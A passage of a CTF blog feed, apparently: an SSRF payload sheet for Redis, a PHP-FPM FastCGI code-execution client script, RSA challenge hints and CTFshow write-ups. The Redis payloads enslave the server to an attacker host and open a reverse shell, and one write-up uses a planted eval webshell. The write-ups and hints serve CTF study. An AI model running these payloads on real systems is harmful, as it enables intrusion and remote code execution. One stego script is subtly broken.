dict协议利用123456789101112131415161718192021#查看当前redis的相关配置ssrf.php?url=dict://1.1.1.1:6379/info#设置当前目录ssrf.php?url=dict://1.1.1.1:6379/config:set:dir:/tmp#设置备份文件名ssrf.php?url=dict://1.1.1.1:6379/config:set:dbfilename:exp.so#连接恶意Redis服务器ssrf.php?url=dict://1.1.1.1:6379/slaveof:2.2.2.2:1234#加载恶意模块ssrf.php?url=dict://1.1.1.1:6379/module:load:/tmp/exp.so#切断主从复制ssrf.php?url=dict://1.1.1.1:6379/slaveof:no:one#执行系统命令ssrf.php?url=dict://1.1.1.1:6379/system.rev:2.2.2.2:9999ssrf.php?url=dict://1.1.1.1:6379/system.exec:env gopher协议利用12345#设置文件名，连接恶意Redis服务器gopher://192.168.172.131:6379/_config%2520set%2520dbfilename%2520exp.so%250d%250aslaveof%2520192.168.172.129%25201234%250d%250aquit#加载exp.so，反弹shellgopher://192.168.172.131:6379/_module%2520load%2520./exp.so%250d%250asystem.rev%2520192.168.172.129%25209999%250d%250aquit ​ PHP-FPM / FastCGIFastCGI是一个协议，PHP-FPM是实现了FastCGI协议的程序，全称PHP FastCGI Process Manager，即PHP FastCGI的进程管理器，运行在默认运行在9000端口。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254import socketimport randomimport argparseimport sysfrom io import BytesIO # Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client PY2 = True if sys.version_info.major == 2 else False #判断python 版本 def bchr(i): if PY2: return force_bytes(chr(i)) else: return bytes([i]) def bord(c): if isinstance(c, int): return c else: return ord(c) def force_bytes(s): if isinstance(s, bytes): return s else: return s.encode(&#x27;utf-8&#x27;, &#x27;strict&#x27;) def force_text(s): if issubclass(type(s), str): return s if isinstance(s, bytes): s = str(s, &#x27;utf-8&#x27;, &#x27;strict&#x27;) else: s = str(s) return s class FastCGIClient: &quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot; # private __FCGI_VERSION = 1 __FCGI_ROLE_RESPONDER = 1 __FCGI_ROLE_AUTHORIZER = 2 __FCGI_ROLE_FILTER = 3 __FCGI_TYPE_BEGIN = 1 __FCGI_TYPE_ABORT = 2 __FCGI_TYPE_END = 3 __FCGI_TYPE_PARAMS = 4 __FCGI_TYPE_STDIN = 5 __FCGI_TYPE_STDOUT = 6 __FCGI_TYPE_STDERR = 7 __FCGI_TYPE_DATA = 8 __FCGI_TYPE_GETVALUES = 9 __FCGI_TYPE_GETVALUES_RESULT = 10 __FCGI_TYPE_UNKOWNTYPE = 11 __FCGI_HEADER_SIZE = 8 # request state FCGI_STATE_SEND = 1 FCGI_STATE_ERROR = 2 FCGI_STATE_SUCCESS = 3 def __init__(self, host, port, timeout, keepalive): self.host = host self.port = port self.timeout = timeout if keepalive: self.keepalive = 1 else: self.keepalive = 0 self.sock = None self.requests = dict() def __connect(self): self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.sock.settimeout(self.timeout) self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # if self.keepalive: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1) # else: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0) try: self.sock.connect((self.host, int(self.port))) except socket.error as msg: self.sock.close() self.sock = None print(repr(msg)) return False return True def __encodeFastCGIRecord(self, fcgi_type, content, requestid): length = len(content) buf = bchr(FastCGIClient.__FCGI_VERSION) \\ + bchr(fcgi_type) \\ + bchr((requestid &gt;&gt; 8) &amp; 0xFF) \\ + bchr(requestid &amp; 0xFF) \\ + bchr((length &gt;&gt; 8) &amp; 0xFF) \\ + bchr(length &amp; 0xFF) \\ + bchr(0) \\ + bchr(0) \\ + content return buf def __encodeNameValueParams(self, name, value): nLen = len(name) vLen = len(value) record = b&#x27;&#x27; if nLen &lt; 128: record += bchr(nLen) else: record += bchr((nLen &gt;&gt; 24) | 0x80) \\ + bchr((nLen &gt;&gt; 16) &amp; 0xFF) \\ + bchr((nLen &gt;&gt; 8) &amp; 0xFF) \\ + bchr(nLen &amp; 0xFF) if vLen &lt; 128: record += bchr(vLen) else: record += bchr((vLen &gt;&gt; 24) | 0x80) \\ + bchr((vLen &gt;&gt; 16) &amp; 0xFF) \\ + bchr((vLen &gt;&gt; 8) &amp; 0xFF) \\ + bchr(vLen &amp; 0xFF) return record + name + value def __decodeFastCGIHeader(self, stream): header = dict() header[&#x27;version&#x27;] = bord(stream[0]) header[&#x27;type&#x27;] = bord(stream[1]) header[&#x27;requestId&#x27;] = (bord(stream[2]) &lt;&lt; 8) + bord(stream[3]) header[&#x27;contentLength&#x27;] = (bord(stream[4]) &lt;&lt; 8) + bord(stream[5]) header[&#x27;paddingLength&#x27;] = bord(stream[6]) header[&#x27;reserved&#x27;] = bord(stream[7]) return header def __decodeFastCGIRecord(self, buffer): header = buffer.read(int(self.__FCGI_HEADER_SIZE)) if not header: return False else: record = self.__decodeFastCGIHeader(header) record[&#x27;content&#x27;] = b&#x27;&#x27; if &#x27;contentLength&#x27; in record.keys(): contentLength = int(record[&#x27;contentLength&#x27;]) record[&#x27;content&#x27;] += buffer.read(contentLength) if &#x27;paddingLength&#x27; in record.keys(): skiped = buffer.read(int(record[&#x27;paddingLength&#x27;])) return record def request(self, nameValuePairs=&#123;&#125;, post=&#x27;&#x27;): if not self.__connect(): print(&#x27;connect failure! please check your fasctcgi-server !!&#x27;) return requestId = random.randint(1, (1 &lt;&lt; 16) - 1) # 1 --65535 self.requests[requestId] = dict() request = b&quot;&quot; beginFCGIRecordContent = bchr(0) \\ + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\ + bchr(self.keepalive) \\ + bchr(0) * 5 request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN, beginFCGIRecordContent, requestId) paramsRecord = b&#x27;&#x27; if nameValuePairs: for (name, value) in nameValuePairs.items(): name = force_bytes(name) value = force_bytes(value) paramsRecord += self.__encodeNameValueParams(name, value) if paramsRecord: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b&#x27;&#x27;, requestId) if post: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b&#x27;&#x27;, requestId) self.sock.send(request) self.requests[requestId][&#x27;state&#x27;] = FastCGIClient.FCGI_STATE_SEND self.requests[requestId][&#x27;response&#x27;] = b&#x27;&#x27; return self.__waitForResponse(requestId) def __waitForResponse(self, requestId): data = b&#x27;&#x27; while True: buf = self.sock.recv(512) if not len(buf): break data += buf data = BytesIO(data) while True: response = self.__decodeFastCGIRecord(data) if not response: break if response[&#x27;type&#x27;] == FastCGIClient.__FCGI_TYPE_STDOUT \\ or response[&#x27;type&#x27;] == FastCGIClient.__FCGI_TYPE_STDERR: if response[&#x27;type&#x27;] == FastCGIClient.__FCGI_TYPE_STDERR: self.requests[&#x27;state&#x27;] = FastCGIClient.FCGI_STATE_ERROR if requestId == int(response[&#x27;requestId&#x27;]): self.requests[requestId][&#x27;response&#x27;] += response[&#x27;content&#x27;] if response[&#x27;type&#x27;] == FastCGIClient.FCGI_STATE_SUCCESS: self.requests[requestId] return self.requests[requestId][&#x27;response&#x27;] def __repr__(self): return &quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;.format(self.host, self.port) if __name__ == &#x27;__main__&#x27;: parser = argparse.ArgumentParser(description=&#x27;Php-fpm code execution vulnerability client.&#x27;) parser.add_argument(&#x27;host&#x27;, help=&#x27;Target host, such as 127.0.0.1&#x27;) parser.add_argument(&#x27;file&#x27;, help=&#x27;A php file absolute path, such as /usr/local/lib/php/System.php&#x27;) parser.add_argument(&#x27;-c&#x27;, &#x27;--code&#x27;, help=&#x27;What php code your want to execute&#x27;, default=&#x27;&lt;?php phpinfo(); exit; ?&gt;&#x27;) parser.add_argument(&#x27;-p&#x27;, &#x27;--port&#x27;, help=&#x27;FastCGI port&#x27;, default=9000, type=int) args = parser.parse_args() client = FastCGIClient(args.host, args.port, 3, 0) params = dict() documentRoot = &quot;/&quot; uri = args.file content = args.code params = &#123; &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;, &#x27;REQUEST_METHOD&#x27;: &#x27;POST&#x27;, &#x27;SCRIPT_FILENAME&#x27;: documentRoot + uri.lstrip(&#x27;/&#x27;), &#x27;SCRIPT_NAME&#x27;: uri, &#x27;QUERY_STRING&#x27;: &#x27;&#x27;, &#x27;REQUEST_URI&#x27;: uri, &#x27;DOCUMENT_ROOT&#x27;: documentRoot, &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;, &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;, &#x27;REMOTE_PORT&#x27;: &#x27;9985&#x27;, &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;, &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;, &#x27;SERVER_NAME&#x27;: &quot;localhost&quot;, &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;, &#x27;CONTENT_TYPE&#x27;: &#x27;application/text&#x27;, &#x27;CONTENT_LENGTH&#x27;: &quot;%d&quot; % len(content), &#x27;PHP_VALUE&#x27;: &#x27;auto_prepend_file = php://input&#x27;, &#x27;PHP_ADMIN_VALUE&#x27;: &#x27;allow_url_include = On&#x27; &#125; response = client.request(params, content) print(force_text(response)) # python fpm.py -c &quot;&lt;?php system(&#x27;ls /&#x27;);?&gt;&quot; -p 12345 127.0.0.1 /var/www/html/index.php 将数据URL两次编码： 123456# -*- coding: UTF-8 -*-from urllib.parse import quote, unquote, urlencodefile= open(&#x27;1.txt&#x27;,&#x27;rb&#x27;)payload= file.read()payload= quote(payload).replace(&quot;%0A&quot;,&quot;%0A%0D&quot;)print(&quot;gopher://127.0.0.1:9000/_&quot;+quote(payload)) ​ 参考SSRF payloads","categories":[{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"}],"tags":[{"name":"SSRF","slug":"SSRF","permalink":"https://lazzzaro.github.io/tags/SSRF/"}],"author":"Lazzaro"},{"title":"CTFshow供题 unusualrsa系列","slug":"other-CTFshow供题-unusualrsa系列","date":"2020-09-01T15:13:24.000Z","updated":"2021-10-16T16:24:39.924Z","comments":true,"path":"2020/09/01/other-CTFshow供题-unusualrsa系列/","permalink":"https://lazzzaro.github.io/2020/09/01/other-CTFshow%E4%BE%9B%E9%A2%98-unusualrsa%E7%B3%BB%E5%88%97/","excerpt":"","text":"​ 看到CTFshow上新上的easyrsa及funnyrsa系列题，手痒出了5道比较高阶的unusualrsa系列题。 在此仅提供思路以辅助，代码实现由读者自行查找/学习/完成/致用。如有疑问，欢迎留言。 ​ unusualrsa1明文 $m$ 高位泄露，泄露部分位数为 $2044-315=1729$，前部分添加 $208$ 位随机字符做padding以防止直接从 $c$ 还原出部分 $m$ 中的字符。可采用Coppersmith攻击中已知明文高位攻击方法。 算法说明 假设我们首先加密了消息 $m$，如下 $C\\equiv m^e \\bmod N$ 并且我们假设我们知道消息 $m$ 的很大的一部分 $m_0$，即 $m=m_0+x$，但是我们不知道 $x$。那么我们就有可能通过该方法进行恢复消息。这里我们不知道的 $x$ 其实就是多项式的根，需要满足 Coppersmith 的约束。 当 $e$ 足够小，且部分明文泄露时，可以采用Coppersmith单变量模等式的攻击，如下： $c=m^{e}\\bmod n=(mbar+x_{0})^{e}\\bmod n$，其中 $mbar = (m &gt;&gt; kbits) &lt;&lt; kbits$ 当 $\\vert x_{0}\\vert\\leq N^{\\frac{1}{e}}$ 时，可以在 $\\log N$ 和 $e$ 的多项式时间内求出 $x_0$。 ​ unusualrsa2 Related Message Attack 正确理解lambda函数及reduce函数的概念，发现reduce(lambda xxx,[yyy,zzz])实际就是对list参数从头元素至尾元素应用一遍lambda匿名函数的操作，得到最终结果。 第一步，assert函数用于确定x及y两个list的值（解一元二次方程），勿与匿名函数的参数名混淆； 第二步，pow(2*m+3,17,n)及pow(4*m+11,17,n)对应输出结果： $c_1=(2m+3)^{17} \\pmod n \\\\ c_2=(4m+11)^{17} \\pmod n$ 第三步，采用Coppersmith’s Short-pad Attack &amp; Related Message Attack（又称Franklin-Reiter攻击），其中此题的 $4m+11$ 可以等价构造为： $4m+11=2\\cdot(2m+3)+5$。 算法说明 目前在大部分消息加密之前都会进行 padding，但是如果 padding 的长度过短（$m \\in (0,\\lfloor\\frac{n.nbits()}{e^2}\\rfloor]$），也有可能被很容易地攻击。 这里所谓 padding 过短，其实就是对应的多项式的根会过小。 当 Alice 使用同一公钥对两个具有某种线性关系的消息 $M_1$ 与 $M_2$ 进行加密，并将加密后的消息 $C_1$，$C_2$ 发送给了 Bob 时，我们就可能可以获得对应的消息 $M_1$ 与 $M_2$ 。这里我们假设模数为 $N$，两者之间的线性关系如下： $M_1 \\equiv f(M_2) \\bmod N$ 其中 $f$ 为一个线性函数，比如说 $f=ax+b$。 在具有较小错误概率下的情况下，其复杂度为 $O(e\\log^2N)$。 这一攻击由 Franklin与Reiter 提出。 ​ unusualrsa3多项式RSA，整数RSA的变种，借助Sage工具求解。 定义与原理 在有限域上选取两个不可约多项式 $g(p),g(q)$，$g(n)=g(p) \\cdot g(q)$，计算出 $g(n)$ 的欧拉函数 $\\varphi(g(n))=\\varphi$， 选取一个整数 $e$ 作为公钥，$e$ 与 $\\varphi$ 是互素的，那么对于明文 $g(m)$，加密过程为 $g(m)^e \\equiv g(c) \\pmod {g(n)}$， 计算私钥 $d$ 满足 $ed \\equiv 1 \\pmod \\varphi$，则 $g(c)^d \\equiv (g(m)^e)^d \\equiv g(m)^{ed} \\equiv g(m)^{\\varphi+1} \\pmod {g(n)}$， 同样考虑 $g(n)$ 与 $g(m)$ 互素，欧拉定理对于多项式亦成立， 得到 $g(m)^{\\varphi+1} \\equiv g(m) \\pmod {g(n)}$，所以 $g(c)^d \\equiv g(m) \\pmod {g(n)}$。 显然RSA对于整数的体制可以适用于有限域上的多项式。 注意 对于素数 $x$，$\\varphi(x)=x-1$，但是对于不可约多项式 $g(x)$，$\\varphi(g(x))=p^n-1$。（此 $p$ 为 $GF(p)$ 的模，此 $n$ 为多项式最高项次数） 原因： 由欧拉函数定义本身，欧拉函数是小于 $n$ 的所有与 $n$ 互质的数的个数。 多项式的欧拉函数则类似，表示不高于 $g(x)$ 幂级的环内所有多项式中，与 $g(x)$ 无公因式（非1）的其他多项式的个数，所以每一个不高于 $g(x)$ 幂级的环内多项式（除了它自己）均满足此条件。 ​ unusualrsa4 Hint1: ed=1+kφ 比较e与k比特位数 联立两式，尝试化简 (inv(q,p)·φ) mod p Hint2: 费马小定理 对于任意 r,k1,k2，当 k2 为 k1 因子时，r mod k2=(r mod k1) mod k2 已知 $e,d,inv(q,p),c$，且 $p,q$ 同比特位数。 令 $cf=q^{-1} \\bmod p$，有 $q\\cdot cf=1 \\pmod p$。 $ed=1+k(p-1)(q-1)$， 比较比特位数，$k$ 与 $e$ 同长，可爆破 $k$，得 $\\varphi(n)=(p-1)(q-1)=\\cfrac{ed-1}{k}$； 上式 $\\varphi(n) =(p-1)(q-1) \\pmod p=-(q-1) \\pmod p$， 结合 $q\\cdot cf=1 \\pmod p$，即 $q\\cdot cf-1=0 \\pmod p$， 联立： $\\begin{eqnarray} \\varphi(n)&amp;=&amp;(p-1)(q-1)\\\\&amp;=&amp;pq-p-q+1\\\\&amp;=&amp;n-p-q+1 \\end{eqnarray}$ $\\begin{eqnarray} cf\\cdot \\varphi(n)&amp;=&amp;cf\\cdot(n-p-q+1)\\\\&amp;=&amp;cf\\cdot n-cf\\cdot p-cf\\cdot q+cf \\end{eqnarray}$ $\\begin{eqnarray} cf\\cdot \\varphi(n) \\bmod p&amp;=&amp;(cf\\cdot n-cf\\cdot p-cf\\cdot q+cf) \\bmod p\\\\&amp;=&amp;0-0-(cf\\cdot q)+cf \\bmod p\\\\&amp;=&amp;-1+cf \\bmod p \\end{eqnarray}$ 有 $1+cf\\cdot \\varphi(n)-cf=0\\pmod p$， 即$x=1+cf\\cdot \\varphi(n)-cf$ 能被 $p$ 整除； 由费马小定理，存在 $r$ 满足 $r^{p-1}=1 \\pmod p$， $\\begin{eqnarray}r^{\\varphi(n)}&amp;=&amp;(r^{(p-1)})^{(q-1)}\\\\&amp;=&amp;1^{(q-1)} \\pmod p\\\\&amp;=&amp;1 \\pmod p \\end{eqnarray}$， 因对于任意 $r,k_1,k_2$，当 $k_2$ 为 $k_1$ 因子时，$r \\bmod k_2=(r \\bmod k_1) \\bmod k_2$， 故 $r^{\\varphi(n)} \\bmod p=(r^{\\varphi(n)} \\bmod x) \\bmod p=1 \\bmod p=kp$， 已知 $\\varphi(n)$，由 $(r^{\\varphi(n)} \\bmod x) \\bmod p=kp$ 可得到多组 $p$ 的乘积，计算 $\\gcd$ 可得到 $p$； 由 $q\\cdot cf=1 \\pmod p$ 求模逆可得 $q$，再用 $c$ 计算出 $m$。 ​ unusualrsa5 有限域 n-th root 发现 $\\gcd(e,\\varphi) =e$ 且 $e\\mid (p-1),e\\mid (q-1)$。 解题思路即求解 $m \\bmod p$ 和 $m \\bmod q$ ，再通过CRT还原 $m \\bmod n$。 这里 $e$ 与 $p-1$ 和 $q-1$ 都不互素，不能简单地求个逆元就完事，主要难点则是在有限域 $GF(p)$ 上求 $e$ 次根。 在有限域上求r-th root有两个常见算法：Adleman-Manders-Miller algorithm (AMM) 和Cipolla-Lehmer algorithm (CL)，这里采用AMM算法（paper）。 这个算法只能开出一个根，实际上开 $e$ 次方，最多会有 $e$ 个根（这题的情况下有0x1337个根）。 如何找到其他根？ StackOverflow – Cube root modulo P 给出了方法。 如何找到所有的primitive n-th root of 1? StackExchange – Finding the n-th root of unity in a finite field 给出了方法。 以 e=0x1337​ 为例： 先用Adleman-Manders-Miller rth Root Extraction Method在 $GF(p)$ 和 $GF(q)$ 上对 $c$ 开 $e$ 次方根，分别得到一个解。大概不到10秒。 然后去找到所有的0x1336个primitive nth root of 1，乘以上面那个解，得到所有的0x1337个解。大概1分钟。 再用CRT对 $GF(p)$ 和 $GF(q)$ 上的两组0x1337个解组合成 $\\bmod n$ 下的解，可以得到0x1337**2=24196561个 $\\bmod n$ 的解。最后能通过check()的即为flag。大概十几分钟。 此题可根据上述算法或利用Sage自带函数实现计算。","categories":[{"name":"other","slug":"other","permalink":"https://lazzzaro.github.io/categories/other/"}],"tags":[{"name":"RSA","slug":"RSA","permalink":"https://lazzzaro.github.io/tags/RSA/"}],"author":"Lazzaro"},{"title":"CTFshow 菜鸡杯","slug":"match-CTFshow-菜鸡杯","date":"2020-08-29T09:58:28.000Z","updated":"2020-08-30T04:35:41.960Z","comments":true,"path":"2020/08/29/match-CTFshow-菜鸡杯/","permalink":"https://lazzzaro.github.io/2020/08/29/match-CTFshow-%E8%8F%9C%E9%B8%A1%E6%9D%AF/","excerpt":"","text":"​ https://hub.ctfer.com/ 任务：打败五大派高手的围攻，最后挑战邪恶BOSS【没技术是菜鸡】 比赛：CTFshow 菜鸡杯 (简称：鸡杯) 开始：2020/8/29 9:00 结束：2020/8/30 9:00 题目： web 杂项 密码 逆向 pwn 若干道 规则：1 比赛期间可以随意讨论，wp须在比赛结束后发布，wp统一发布地址：https://wp.ctf.show2 公平竞技，独立比赛3 服务器不要爆破，不要攻击服务器，不要扫描!!!4 奖品：rank最高的师傅获得武林神器：上古鸡杯 x 1 ，获得称号：鸡杯王 第一关 Web派的挑战摇号入园 http://119.28.74.193:28066/ hint:后台里面找邮箱 发现页面有报错，index.php含一句话马eval($_POST[1]); 直接上蚁剑，使用密码1连接http://119.28.74.193:28066/index.php，拿到webshell，接下来找flag； 查看目录列表查看最近修改的文件未发现flag，根据修改日期，进入命令行用find命令按内容搜索config和runtime目录： find /var/www/html/config | xargs grep &quot;flag&#123;&quot; find /var/www/html/runtime | xargs grep &quot;flag&#123;&quot; 在/var/www/html/rumtime/log/202008/22.log中找到flag： 123456789(www-data:/var/www/html/runtime) $ find . | xargs grep &quot;flag&#123;&quot;grep: .: Is a directorygrep: ./cache: Is a directorygrep: ./cache/4e: Is a directorygrep: ./temp: Is a directorygrep: ./log: Is a directorygrep: ./log/202008: Is a directory./log/202008/22.log: &#x27;email_password&#x27; =&gt; &#x27;flag&#123;ctf_show_boy&#125;&#x27;,./log/202008/22.log:[ sql ] [ SQL ] UPDATE `kite_site_config` SET `v` = &#x27;flag&#123;ctf_show_boy&#125;&#x27; WHERE `site_id` = 1 AND `k` = &#x27;email_password&#x27; [ RunTime:0.000250s ] ​ 第二关 杂项派的挑战猎兔 https://ctfshow.lanzous.com/imJj4g62dwj png文件 hint: 兔兔数列 查看16进制发现crc值不匹配，用png图片宽高爆破脚本得到正确高度（或直接改大高度），修改得到提示： 结合hint，兔子数列即为斐波那契数列。 用zsteg查看png图有无隐写内容，发现lsb按列提取的green最低位有一串接近flag的字符串： 看到其中flag&#123;五个字符串分别对应着0,1,2,4,7位（反斜杠转义），差值为1,1,2,3刚好对应斐波那契数列前四项； 用stegsolve.jar取出lsb按列提取的green最低位完整字符串，存bin文件： 最后用脚本按斐波那契数列方式提取字符拼接： 12345678910111213141516s=open(&#x27;out.bin&#x27;,&#x27;r&#x27;).read()t=[1,1]for i in range(2,100): t.append(t[i-1]+t[i-2])flag=&#x27;&#x27;i=0j=0while j&lt;len(s): if j&gt;=len(s): break ss+=s[j] j+=t[i] i+=1 print(flag) ​ 初音未来-圆周率之歌 https://ctfshow.lanzous.com/iq64Jg62egj mp3文件 hint1: 歌词，看看那首歌最后 hint2: 福尔摩斯有一章说过，这种形式的密文 一般都需要一个字典。这种组合，一般表示 要么是 多少页的第多几个单词。但是因为 xxxx 比较大，一般没有这么厚的书。所以我们可以认为，他是一个灰常长的字典，然后？表示顺序截取？个字符。 audacity查看mp3音频没什么发现，后放出两个hint，思路很明显了。 mp3文件最后内容： 歌词为10000+位 $\\pi$ 的值，按照其中的(a,b)组合分别从歌词提取a位置开始b长度的数字，再转成字符即可。 1234567891011#f=open(&#x27;pi.mp3&#x27;,&#x27;rb&#x27;).read()[-250:]dic=&#123;2750:3,2535:3,739:2,3487:3,1925:3,451:2,898:2,1479:2,1623:2,1541:2,1232:2,1118:2,1780:2,594:2,2033:2,79:2,1193:2,406:2,1623:2,774:2,1223:2,1351:3&#125;s=&#x27;3.14159265358979323846264338327950288419716939937510582097494459230781640628620899862803482534211706798214808651328230664709384460955058223172535940812848111745028410270193852110555964462294895493038196442881097566593344612847564823378678316527120190914564856692346034861045432664821339360726024914127372458700660631558817488152092096282925409171536436789259036001133053054882046652138414695194151160943305727036575959195309218611738193261179310511854807446237996274956735188575272489122793818301194912983367336244065664308602139494639522473719070217986094370277053921717629317675238467481846766940513200056812714526356082778577134275778960917363717872146844090122495343014654958537105079227968925892354201995611212902196086403441815981362977477130996051870721134999999837297804995105973173281609631859502445945534690830264252230825334468503526193118817101000313783875288658753320838142061717766914730359825349042875546873115956286388235378759375195778185778053217122680661300192787661119590921642019893809525720106548586327886593615338182796823030195203530185296899577362259941389124972177528347913151557485724245415069595082953311686172785588907509838175463746493931925506040092770167113900984882401285836160356370766010471018194295559619894676783744944825537977472684710404753464620804668425906949129331367702898915210475216205696602405803815019351125338243003558764024749647326391419927260426992279678235478163600934172164121992458631503028618297455570674983850549458858692699569092721079750930295532116534498720275596023648066549911988183479775356636980742654252786255181841757467289097777279380008164706001614524919217321721477235014144197356854816136115735255213347574184946843852332390739414333454776241686251898356948556209921922218427255025425688767179049460165346680498862723279178608578438382796797668145410095388378636095068006422512520511739298489608412848862694560424196528502221066118630674427862203919494504712371378696095636437191728746776465757396241389086583264599581339047802759009946576407895126946839835259570982582262052248940772671947826848260147699090264013639443745530506820349625245174939965143142980919065925093722169646151570985838741059788595977297549893016175392846813826868386894277415599185592524595395943104997252468084598727364469584865383673622262609912460805124388439045124413654976278079771569143599770012961608944169486855584840635342207222582848864815845602850601684273945226746767889525213852254995466672782398645659611635488623057745649803559363456817432411251507606947945109659609402522887971089314566913686722874894056010150330861792868092087476091782493858900971490967598526136554978189312978482168299894872265880485756401427047755513237964145152374623436454285844479526586782105114135473573952311342716610213596953623144295248493718711014576540359027993440374200731057853906219838744780847848968332144571386875194350643021845319104848100537061468067491927819119793995206141966342875444064374512371819217999839101591956181467514269123974894090718649423196156794520809514655022523160388193014209376213785595663893778708303906979207734672217256259966150142150306803844773454920260541466592520149744285073251866600213243408819071048633173464965145390579626856100550810665879699816357473638405257145910289706414011097120628043903975951567715770042033786993600723055876317635942187312514712053292819182618612586732157919841484882916447060957527069572209175671167229109816909152801735067127485832228718352093539657251210835791513698820914442100675103346711031412671113699086585163983150197016515116851714376576183515565088490998985998238734552833163550764791853589322618548963213293308985706420467525907091548141654985946163718027098199430992448895757128289059232332609729971208443357326548938239119325974636673058360414281388303203824903758985243744170291327656180937734440307074692112019130203303801976211011004492932151608424448596376698389522868478312355265821314495768572624334418930396864262434107732269780280731891544110104468232527162010526522721116603966655730925471105578537634668206531098965269186205647693125705863566201855810072936065987648611791045334885034611365768675324944166803962657978771855608455296541266540853061434443185867697514566140680070023787765913440171274947042056223053899456131407112700040785473326993908145466464588079727082668306343285878569830523580893306575740679545716377525420211495576158140025012622859413021647155097925923099079654737612551765675135751782966645477917450112996148903046399471329621073404375189573596145890193897131117904297828564750320319869151402870808599048010941214722131794764777262241425485454033215718530614228813758504306332175182979866223717215916077166925474873898665494945011465406284336639379003976926567214638530673609657120918076383271664162748888007869256029022847210403172118608204190004229661711963779213375751149595015660496318629472654736425230817703675159067350235072835405670403867435136222247715891504953098444893330963408780769325993978054193414473774418426312986080998886874132604721569516239658645730216315981931951673538129741677294786724229246543668009806769282382806899640048243540370141631496589794092432378969070697794223625082216889573837986230015937764716512289357860158816175578297352334460428151262720373431465319777741603199066554187639792933441952154134189948544473456738316249934191318148092777710386387734317720754565453220777092120190516609628049092636019759882816133231666365286193266863360627356763035447762803504507772355471058595487027908143562401451718062464362679456127531813407833033625423278394497538243720583531147711992606381334677687969597030983391307710987040859133746414428227726346594704745878477872019277152807317679077071572134447306057007334924369311383504931631284042512192565179806941135280131470130478164378851852909285452011658393419656213491434159562586586557055269049652098580338507224264829397285847831630577775606888764462482468579260395352773480304802900587607582510474709164396136267604492562742042083208566119062545433721315359584506877246029016187667952406163425225771954291629919306455377991403734043287526288896399587947572917464263574552540790914513571113694109119393251910760208252026187985318877058429725916778131496990090192116971737278476847268608490033770242429165130050051683233643503895170298939223345172201381280696501178440874519601212285993716231301711444846409038906449544400619869075485160263275052983491874078668088183385102283345085048608250393021332197155184306354550076682829493041377655279397517546139539846833936383047461199665385815384205685338621867252334028308711232827892125077126294632295639898989358211674562701021835646220134967151881909730381198004973407239610368540664319395097901906996395524530054505806855019567302292191393391856803449039820595510022635353619204199474553859381023439554495977837790237421617271117236434354394782218185286240851400666044332588856986705431547069657474585503323233421073015459405165537906866273337995851156257843229882737231989875714159578111963583300594087306812160287649628674460477464915995054973742562690104903778198683593814657412680492564879855614537234786733039046883834363465537949864192705638729317487233208376011230299113679386270894387993620162951541337142489283072201269014754668476535761647737946752004907571555278196536213239264061601363581559074220202031872776052772190055614842555187925303435139844253223415762336106425063904975008656271095359194658975141310348227693062474353632569160781547818115284366795706110861533150445212747392454494542368288606134084148637767009612071512491404302725386076482363414334623518975766452164137679690314950191085759844239198629164219399490723623464684411739403265918404437805133389452574239950829659122850855582157250310712570126683024029295252201187267675622041542051618416348475651699981161410100299607838690929160302884002691041407928862150784245167090870006992821206604183718065355672525325675328612910424877618258297651579598470356222629348600341587229805349896502262917487882027342092222453398562647669149055628425039127577102840279980663658254889264880254566101729670266407655904290994568150652653053718294127033693137851786090407086671149655834343476933857817113864558736781230145876871266034891390956200993936103102916161528813843790990423174733639480457593149314052976347574811935670911013775172100803155902485309066920376719220332290943346768514221447737939375170344366199104033751117354719185504644902636551281622882446257591633303910722538374218214088350865739177150968288747826569959957449066175834413752239709683408005355984917541738188399944697486762655165827658483588453142775687900290951702835297163445621296404352311760066510124120065975585127617858382920419748442360800719304576189323492292796501987518721272675079812554709589045563579212210333466974992356302549478024901141952123828153091140790738602515227429958180724716259166854513331239480494707911915326734302824418604142636395480004480026704962482017928964766975831832713142517029692348896276684403232609275249603579964692565049368183609003238092934595889706953653494060340216654437558900456328822505452556405644824651518754711962184439658253375438856909411303150952617937800297412076651479394259029896959469955657612186561967337862362561252163208628692221032748892186543648022967807057656151446320469279068212073883778142335628236089632080682224680122482611771858963814091839036736722208883215137556003727983940041529700287830766709444745601345564172543709069793961225714298946715435784687886144458123145935719849225284716050492212424701412147805734551050080190869960330276347870810817545011930714122339086639383395294257869050764310063835198343893415961318543475464955697810382930971646514384070070736041123735998434522516105070270562352660127648483084076118301305279320542746286540360367453286510570658748822569815793678976697422057505968344086973502014102067235850200724522563265134105592401902742162484391403599895353945909440704691209140938700126456001623742880210927645793106579229552498872758461012648369998922569596881592056001016552563756785667227966198857827948488558343975187445455129656344348039664205579829368043522027709842942325330225763418070394769941597915945300697521482933665556615678736400536665641654732170439035213295435291694145990416087532018683793702348886894791&#x27;flag=&#x27;&#x27;for k,v in 